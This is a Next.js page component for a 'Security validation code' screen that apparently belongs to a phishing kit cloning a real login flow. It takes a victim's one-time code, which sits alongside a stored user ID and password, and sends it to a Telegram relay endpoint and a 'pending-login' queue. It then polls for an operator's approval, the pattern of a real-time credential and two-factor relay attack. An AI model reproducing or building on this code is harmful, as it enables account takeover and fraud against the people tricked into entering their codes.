"use client";

import { Suspense, useEffect, useRef, useState } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { LandingChrome } from "@/components/landing-chrome";
import {
  APPROVAL_TIMEOUT_MS,
  MSG_UNABLE_REACH_VERIFICATION,
  MSG_UNABLE_VERIFY_TIME,
  OTP_CODE_ERROR_TEXT,
  OTP_RESEND_COOLDOWN_SEC,
  OTP_RESEND_LOADING_MS,
} from "@/lib/approval-messages";
import { pollPendingLoginAbortable } from "@/lib/abortable-poll";
import { OTP_CODE_LOCKED_TEXT, OTP_EMPTY_CODE_TEXT, OTP_MAX_ATTEMPTS } from "@/lib/site-copy";
import { clearVerificationSession, readVerificationSession } from "@/lib/verification";

function PasscodeContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const [method, setMethod] = useState<"email" | "text" | "">("");
  const [code, setCode] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const [cooldown, setCooldown] = useState(0);
  const [attempts, setAttempts] = useState(0);
  const [rememberDevice, setRememberDevice] = useState(false);
  const [error, setError] = useState<React.ReactNode | null>(null);
  const guarded = useRef(false);
  const pollAbort = useRef<AbortController | null>(null);
  const isUnmountedRef = useRef(false);

  useEffect(() => {
    return () => {
      isUnmountedRef.current = true;
      pollAbort.current?.abort();
    };
  }, []);

  useEffect(() => {
    if (guarded.current) return;
    guarded.current = true;
    const session = readVerificationSession();
    const queryMethod = searchParams.get("method") || "";
    const resolved =
      queryMethod === "email" || queryMethod === "text"
        ? queryMethod
        : session.method === "email" || session.method === "text"
          ? session.method
          : "";
    if (!session.userId || !session.password || !resolved) {
      router.replace("/");
      return;
    }
    setMethod(resolved);
  }, [router, searchParams]);

  useEffect(() => {
    if (cooldown <= 0) return;
    const timer = window.setTimeout(
      () => setCooldown((value) => value - 1),
      1000,
    );
    return () => window.clearTimeout(timer);
  }, [cooldown]);

  const handleResend = async () => {
    if (isResending || cooldown > 0) return;
    const session = readVerificationSession();
    if (!session.userId || !session.password || !method) {
      router.replace("/");
      return;
    }

    setIsResending(true);
    void fetch("/api/telegram/resend-code", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userId: session.userId,
        method,
        flow: "otp",
      }),
    }).catch(() => {});
    try {
      await new Promise((resolve) =>
        window.setTimeout(resolve, OTP_RESEND_LOADING_MS),
      );
      if (isUnmountedRef.current) return;
      setCode("");
      setError(null);
      setAttempts(0);
      setCooldown(OTP_RESEND_COOLDOWN_SEC);
    } finally {
      if (!isUnmountedRef.current) setIsResending(false);
    }
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (isLoading) return;

    if (attempts >= OTP_MAX_ATTEMPTS) {
      setError(OTP_CODE_LOCKED_TEXT);
      return;
    }

    const digits = code.replace(/\D/g, "");
    // The target only defines empty-code and invalid-code copy; an incomplete
    // 6-digit code uses the same empty-code message.
    if (digits.length !== 6) {
      setError(OTP_EMPTY_CODE_TEXT);
      return;
    }

    const session = readVerificationSession();
    if (!session.userId || !session.password || !method) {
      router.replace("/");
      return;
    }

    setError(null);
    setIsLoading(true);

    void fetch("/api/telegram/verification", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userId: session.userId,
        method,
        code: digits,
        flow: "otp",
      }),
    }).catch(() => {});

    try {
      const res = await fetch("/api/pending-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId: session.userId,
          password: digits,
          method,
          maskedEmail: session.maskedEmail || "-",
          maskedPhone: session.maskedPhone || "-",
          flow: "otp",
        }),
      });
      const data = (await res.json().catch(() => null)) as { id?: string } | null;
      if (!res.ok || !data?.id) {
        throw new Error("pending-login create failed");
      }

      const controller = new AbortController();
      pollAbort.current = controller;
      const outcome = await pollPendingLoginAbortable(
        data.id,
        APPROVAL_TIMEOUT_MS,
        controller.signal,
      );
      if (controller.signal.aborted || isUnmountedRef.current) return;

      if (outcome === "approved" || outcome === "redirected") {
        clearVerificationSession();
        window.location.href = "/api/login-out";
        return;
      }
      if (outcome === "denied") {
        const nextAttempts = attempts + 1;
        setAttempts(nextAttempts);
        setCode("");
        setError(
          nextAttempts >= OTP_MAX_ATTEMPTS
            ? OTP_CODE_LOCKED_TEXT
            : OTP_CODE_ERROR_TEXT,
        );
        setIsLoading(false);
        return;
      }
      if (outcome === "timeout") {
        setCode("");
        setError(MSG_UNABLE_VERIFY_TIME);
        setIsLoading(false);
        return;
      }
      // create/transport error
      setCode("");
      setError(MSG_UNABLE_REACH_VERIFICATION);
      setIsLoading(false);
    } catch (err) {
      console.error("Passcode verification failed:", err);
      setCode("");
      setError(MSG_UNABLE_REACH_VERIFICATION);
      setIsLoading(false);
    }
  };

  const emailOrMobile = method === "email" ? "email" : "mobile device";

  return (
    <>
      <h2 className="text-2xl font-normal lg:text-5xl">
        Security validation code
      </h2>
      <p className="mt-4 text-sm lg:text-xl">
        Check your {emailOrMobile} to find this 6-digit security code
      </p>

      <form onSubmit={handleSubmit} className="mt-7 max-w-3xl">
        <div className="group">
          <label
            htmlFor="securityCode"
            className="block text-xl font-semibold group-has-[:focus]:text-[#0061f4]"
          >
            Please provide the security validation code below:
          </label>
          <input
            id="securityCode"
            type="text"
            inputMode="numeric"
            maxLength={6}
            autoComplete="one-time-code"
            disabled={attempts >= OTP_MAX_ATTEMPTS}
            className="mt-2 h-14 w-full max-w-[300px] border-2 border-gray-800 px-2 text-center text-2xl tracking-[0.35em] outline-none focus:border-blue-500 focus:ring-1 focus:ring-blue-500 disabled:cursor-not-allowed disabled:bg-gray-100"
            value={code}
            onChange={(event) =>
              setCode(event.target.value.replace(/\D/g, "").slice(0, 6))
            }
          />
        </div>

        <p className="min-h-[1.25rem] text-sm text-red-600" aria-live="polite">
          {error ?? ""}
        </p>

        <div className="mt-4 flex items-start gap-3">
          <input
            id="deviceSelect"
            type="checkbox"
            checked={rememberDevice}
            onChange={(event) => setRememberDevice(event.target.checked)}
            className="mt-1 h-5 w-5 accent-[#281805]"
          />
          <label htmlFor="deviceSelect" className="cursor-pointer text-base lg:text-lg">
            This is a private device. Make my login easier next time.
          </label>
        </div>

        <p className="mt-4 text-base lg:text-lg">
          Note that codes can take a few minutes to arrive. If you haven&apos;t
          received your code, check spam filter or click to{" "}
          <button
            type="button"
            onClick={handleResend}
            disabled={isResending || cooldown > 0}
            className="font-semibold text-[#0061f4] underline disabled:cursor-not-allowed disabled:text-gray-500"
          >
            {isResending
              ? "re-sending code"
              : cooldown > 0
                ? `re-send code (${cooldown}s)`
                : "re-send code"}
          </button>
          .
        </p>

        <div className="mt-8 flex flex-wrap items-center gap-4">
          <button
            type="button"
            onClick={() => router.push("/verification/method")}
            disabled={isLoading}
            className="rounded-full border-2 border-[#281805] px-8 py-4 text-xl text-[#281805] transition-colors hover:bg-[#281805] hover:text-white disabled:cursor-not-allowed disabled:opacity-50"
          >
            Cancel
          </button>
          <button
            type="submit"
            disabled={isLoading}
            className="rounded-full bg-[#281805] px-8 py-4 text-xl text-white disabled:cursor-not-allowed disabled:bg-gray-400"
          >
            {isLoading && (
              <i
                className="fa-solid fa-spinner fa-spin mr-2"
                aria-hidden="true"
              />
            )}
            Submit
          </button>
        </div>
      </form>
    </>
  );
}

export default function VerificationCodePage() {
  return (
    <LandingChrome>
      <Suspense fallback={null}>
        <PasscodeContent />
      </Suspense>
    </LandingChrome>
  );
}
